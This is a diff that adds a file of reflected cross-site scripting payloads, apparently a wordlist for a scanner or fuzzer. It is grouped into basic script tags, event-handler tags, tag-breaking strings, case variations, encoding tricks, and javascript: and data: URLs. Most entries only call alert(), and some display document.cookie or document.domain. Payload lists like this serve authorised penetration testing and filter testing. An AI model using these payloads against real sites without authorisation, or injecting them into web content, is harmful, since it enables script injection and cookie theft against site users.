@@ -1,0 +1,48 @@
+# XSS Reflected Payloads
+
+# Basic
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+
+# Event Handlers
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe onload=alert(1)>
+
+# Tag Breaking
+'><script>alert(1)</script>
+"><script>alert(1)</script>
+</script><script>alert(1)</script>
+'-alert(1)-'
+"-alert(1)-"
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+
+# Case Variations
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<img SRC=x onerror=alert(1)>
+
+# Encoding
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+
+# JavaScript Protocol
+javascript:alert(1)
+javascript:alert(document.domain)
+java%0ascript:alert(1)
+java%0dscript:alert(1)
+
+# Data Protocol
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
